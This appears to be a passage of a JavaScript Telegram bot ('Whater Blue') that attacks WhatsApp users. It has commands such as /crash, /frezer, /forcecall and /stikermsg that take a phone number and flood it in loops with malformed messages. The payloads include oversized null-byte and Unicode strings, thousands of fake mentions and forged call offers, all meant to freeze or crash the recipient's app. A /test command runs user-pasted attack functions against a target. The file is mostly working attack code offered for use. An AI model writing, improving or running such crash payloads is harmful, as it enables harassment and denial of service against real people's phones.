    return ctx.reply("⛔ Hanya owner yang bisa menghapus session.");
  }
  const msg1 = await ctx.reply(" [Menghapus Session] Wait bos sedang menghapus...");
  try {
    if (fs.existsSync(SESSION_DIR)) {
      const files = fs.readdirSync(SESSION_DIR);
      for (const file of files) {
        fs.unlinkSync(path.join(SESSION_DIR, file));
      }
    }
  } catch (err) {
    return ctx.reply("[Gagal] menghapus session: " + err.message);
  }
  const msg2 = await ctx.reply("[Restart] Awaait... restart bot...");
  setTimeout(async () => {
    try {
      await ctx.deleteMessage(msg1.message_id);
      await ctx.deleteMessage(msg2.message_id);
    } catch {}
    await ctx.reply("✅ Session berhasil dihapus.\nBot akan restart otomatis...");
    setTimeout(() => {
      process.exit();
    }, 1500);

  }, 2000);
});
//testfunc
bot.command("test", checkWhatsAppConnection, checkPremium, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("☇ Format: /test 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ Wʜᴀᴛᴇʀ Bʟᴜᴇ ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ Wʜᴀᴛᴇʀ Bʟᴜᴇ ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

//bugscomand
bot.command("frezer", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /frezer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 25; i++) {
    await blanknih(target);
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /frezer
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("crash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /crash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 54; i++) {
    await Attack(sock, target);
    await sleep(1500)
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /crash
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("dlay", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /dlay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 56; i++) {
    await StickersAbim(target);
    await sleep(1500)
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /dlay
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("delayhour", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /delayhour 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 65; i++) {
    await LocX(sock, target);
    await sleep(1000)
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /delayhour
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("blankbutton", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /delayhour 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 5; i++) {
    await Vloodies(target);
    await sleep(1000)
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /delayhour
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("stikermsg", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /delayhour 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 100; i++) {
    await CLMYMMK(sock, target);
    await CLMYMMK(sock, target);
    await sleep(1000)
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /delayhour
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("dlyv2", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /delayhour 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 100; i++) {
    await DelayJarr(target);
    await DelayJarr(target);
    await DelayJarr(target);
    await sleep(1000)
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /delayhour
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command("forcecall", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /delayhour 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
    caption: `
<blockquote><pre>
𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
</pre>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  for (let i = 0; i < 100; i++) {
    await OfferXForclose(sock, target);
    await OfferXForclose(sock, target);
    await OfferXForclose(sock, target);
    await sleep(1000)
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>
☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
Եαяgєτ : ${q}
Ꭻєиιѕ ℬυg : /delayhour
</pre>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
//FUNCTION BUG
async function OfferXForclose(sock, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let Raza = xnxx();
let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let XMods = sock.createParticipantNodes.bind(sock);
let Cyber =
sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {

if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

let memeg = Array.isArray(patched)

? patched

: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;

let omak = meLid ? jidDecode(meLid)?.user : null;

let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {

let { user: targetUser } = jidDecode(jid);

let { user: ownPnUser } = jidDecode(meId);

let isOwnUser = targetUser === ownPnUser || targetUser === omak;

let y = jid === meId || jid === meLid;

if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

return Raza.mutex(jid, async () => {

let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });

if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

return {

tag: 'to',

attrs: { jid },

content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]

};

});

}));

return { nodes: nodes.filter(Boolean),
shouldIncludeDeviceIdentity };

};

let Exo = crypto.randomBytes(32);

let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);

let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {

tag: "call",

attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },

content: [{

tag: "offer",

attrs: {

"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),

"call-creator": sock.user.id

},

content: [

{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },

{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },

{

tag: "video",

attrs: {

orientation: "0",

screen_width: "1920",

screen_height: "1080",

device_orientation: "0",

enc: "vp8",

dec: "vp8"
  

}

},

{ tag: "net", attrs: { medium: "3" } },

{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },

{ tag: "encopt", attrs: { keygen: "2" } },

{ tag: "destination", attrs: {}, content: destinations },

...(shouldIncludeDeviceIdentity ? [{

tag: "device-identity",

attrs: {},

content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)

}] : [])

]

}]

};

await sock.sendNode(lemiting);

}  
async function DelayJarr(target) {
  try {
    let JarrMsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Apakah Cinta Sejati Itu Nyata?",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, JarrMsg, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function CLMYMMK(sock, target) {
                    let msg = await generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                    message: {
                    messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                    },
                    stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc",
                    fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
                    fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
                    mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
                    mimetype: "application/was",
                    height: 512,
                    width: 512,
                    fileLength: 14390,
                    isAnimated: true,
                    contextInfo: {
                        forwardingScore: 9999,
                        isForwarded: true,
                        participant: target,
                        mentionedJid: [
                            ...Array.from(
                                { length: 1600 },
                                () => `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                            )
                        ]
                    }
                    },
                    interactiveResponseMessage: {
                    contextInfo: {
                    mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                    },
                    body: {
                    text: "ោ៝".repeat(3900),
                    format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"᬴".repeat(90000)}\",\"flow_message_version\": \"3\"}`,
                    version: 3
                    }
                    }
                    }
                    }
                    }, {});

                    for (let x = 0; x < 50; x++) {
                    await sock.relayMessage(
                    target,
                    {
                    groupStatusMessageV2: {
                    message: msg.message
                    }
                    },
                    {
                    messageId: msg.key.id,
                    participant: { jid: target } 
                    }
                    )
                    };

                    await sock.relayMessage(target, {
                    statusMentionMessage: {
                    message: {
                    protocolMessage: {
                    key: msg.key,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    type: 25
                    },
                    additionalNodes: [
                    {
                    tag: "meta",
                    attrs: { is_status_mention: "-503" },
                    content: undefined
                    }
                    ]
                    }
                    }
                    }, {});
}
async function Vloodies(target) {
  const Msgg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "XxX", format: "DEFAULT" },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(5000),
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦾ".repeat(20000),
                    id: "ꦾ".repeat(1000)
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦾ".repeat(20000),
                    url: "https://t.me/zencxv",
                    merchant_url: "https://xnxx.com"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonsParamsJson: "\x10".repeat(1045000)
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "\n".repeat(50000),
                    copy_code: "ꦾ".repeat(50000)
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  for (let i = 0; i < 50; i++) {
    await sock.relayMessage(
      target,
      Msgg.message,
      { messageId: Msgg.key.id }
    );
  }
}
async function blanknih(target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "HALLO ADA ORANG" + "ꦽꦾ".repeat(15000),
      caption: "HALLO ADA ORANG" + "ꦽꦾ".repeat(15000),
      inviteExpiration: "9282682616283736",
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
}
async function Attack(sock, target) {
  try {
    let buttonsFreze = [];

    buttonsFreze.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });

    for (let i = 0; i < 20000; i++) {
      buttonsFreze.push({
        name: "cta_catalog",
        buttonParamsJson: JSON.stringify({
          status: true,
        }),
      });
    }
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text:
                "I Love U❤" +
                "ꦽ".repeat(50000) +
                "ꦾ".repeat(10000),
            },
            nativeFlowMessage: {
              buttons: buttonsFreze,
              messageParamsJson: "{{".repeat(10000),
            },
            messageVersion: 1,
          },
        },
      },
    };

    const pertama = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    const kedua = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });
  } catch (error) {
    console.error("Terdapat Error", error);
  }
}
async function StickersAbim(target) {
  try {
    const abimsalsa = "\u2063".repeat(5000);
    const salsa = "\u300B".repeat(3000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "ABIM - ANTI GEDOR",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(25900),
              version: 3
            }
          }
        }
      }
    };

    const msg2 = {  
      stickerMessage: {  
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
        mimetype: "image/webp",  
        height: 9999,  
        width: 9999,  
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileLength: 12260,  
        mediaKeyTimestamp: "1743832131",  
        isAnimated: false,  
        stickerSentTs: "X",  
        isAvatar: false,  
        isAiSticker: false,  
        isLottie: false,  
        contextInfo: {  
          mentionedJid: [
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )  
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    const msg3 = {  
      viewOnceMessage: {  
        message: {  
          interactiveMessage: {  
            body: {  
              xternalAdReply: {  
                title: "Abimofficial",  
                text: abimsalsa  
              }  
            },  
            extendedTextMessage: {  
              text: "{".repeat(9000),  
              contextInfo: {  
                mentionedJid: Array.from(
                  { length: 2000 },
                  (_, i) => `1${i}@s.whatsapp.net`
                )
              }  
            },  
            businessMessageForwardInfo: {  
              businessOwnerJid: "13135550002@s.whatsapp.net"  
            },  
            nativeFlowMessage: {  
              buttons: [  
                { name: "view_product", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "address_message", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "single_select", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(4000) + salsa }  
              ],  
              nativeFlowResponseMessage: {  
                name: "galaxy_message",  
                paramsJson: "\u0000".repeat(10),  
                version: 3  
              },  
              contextInfo: {  
                mentionedJid: [  
                  "0@s.whatsapp.net",  
                  ...Array.from(
                    { length: 1900 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )  
                ]  
              }  
            }  
          }  
        }  
      }  
    };

    for (const msg of [msg1, msg2, msg3]) {  
      await sock.relayMessage("status@broadcast", msg, {  
        messageId: undefined,  
        statusJidList: [target],  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }  
            ]  
          }  
        ]  
      });  

      console.log(`Jary & Mau Sedang Ewe ${target} suksesfull`);  
    }

  } catch (e) {
    console.error(e);
  }
}
async function LocX(sock, target) {
  const LocaX = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(150),
          address: "ꦽ".repeat(100),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: target
  });
}
//END FUNCTION
;(async () => {
  await bot.telegram.deleteWebhook({ drop_pending_updates: true })
  bot.launch({ dropPendingUpdates: true })
  console.log('BOT RUNNING')
})()
